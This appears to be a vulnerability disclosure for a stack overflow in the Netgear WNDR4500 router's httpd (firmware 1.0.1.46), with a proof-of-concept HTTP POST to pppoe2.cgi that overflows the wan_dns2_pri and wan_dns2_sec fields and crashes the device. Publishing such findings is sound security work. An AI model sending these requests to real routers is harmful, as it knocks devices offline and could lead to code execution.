# Netgear Vulnerability

Vendor:Netgear

Product:WNDR4500

Version:1.0.1.46

Type:Stack Overflow

Author:Jiaqian Peng

Institution:pengjiaqian@iie.ac.cn



## Vulnerability description

We found an stack overflow vulnerability in Netgear router with firmware which was released recently, allows remote attackers to crash the server. 

**Stack Overflow**

In `httpd` binary:

In the router's `geniepppoe.cgi、wizpppoe.cgi、pppoe2.cgi` function, `wan_dns2_pri、wan_dns2_sec` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `wan_dns2_pri、wan_dns2_sec` to execute arbitrary code.

As you can see here, the input has not been checked. The parameter `wan_dns2_pri、wan_dns2_sec` is directly copy to a local variable placed on the stack, which overrides the return address of the function, causing buffer overflow.

<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>



## PoC

We set `wan_dns2_pri、wan_dns2_sec` as **aaaaa......** , and the router will crash, such as:

```http
POST /pppoe2.cgi?id=a1df39ab2fe6c7ec16e70d4227579011412e246d HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 4622
Origin: http://192.168.1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: close
Referer: http://192.168.1.1/BAS_pppoe_other.htm
Upgrade-Insecure-Requests: 1

undefined=&login_type=PPPoE&pppoe_username=guest&pppoe_passwd=&pppoe_servicename=&pppoe_dod=1&pppoe_idletime=5&WANAssign=Dynamic&DNSAssign=0&FletSel=fletenable&session_type=NTT+East&pppoe2_username=guest&pppoe2_passwd=&pppoe2_servicename=&WANAssign2=Dynamic&DNSAssign2=1&DAddr2_1=8&DAddr2_2=8&DAddr2_3=8&DAddr2_4=8&PDAddr2_1=8&PDAddr2_2=8&PDAddr2_3=8&PDAddr2_4=8&Policy=1&add=+Add+&runtest=no&wan_ipaddr=192.168.0.4&wan2_ipaddr=0.0.0.0&pppoe_localip=0.0.0.0&wan_dns_sel=0&wan_dns1_pri=&wan_dns1_sec=&pppoe2_localip=0.0.0.0&wan2_dns_sel=0&wan_dns2_&wan_dns2_&FletType=2&ToDisable=&whichTest=&policyIdx=&pppoe_temp=4
```



## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
